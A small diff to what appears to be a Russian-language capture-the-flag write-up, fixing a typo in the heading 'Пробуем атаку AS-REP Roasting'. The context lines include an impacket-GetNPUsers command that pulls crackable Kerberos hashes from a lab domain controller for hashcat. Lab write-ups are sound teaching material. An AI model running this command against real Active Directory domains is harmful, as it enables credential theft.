@@ -44,7 +44,7 @@ j-goldenhand
 j-leet
 ```
 
-Пробуем акаку AS-REP Roasting
+Пробуем атаку AS-REP Roasting
 ```bash
 impacket-GetNPUsers vulnnet-rst.local/ -usersfile users.txt -dc-ip target_ip -format hashcat -outputfile hashes.asreproast
 ```
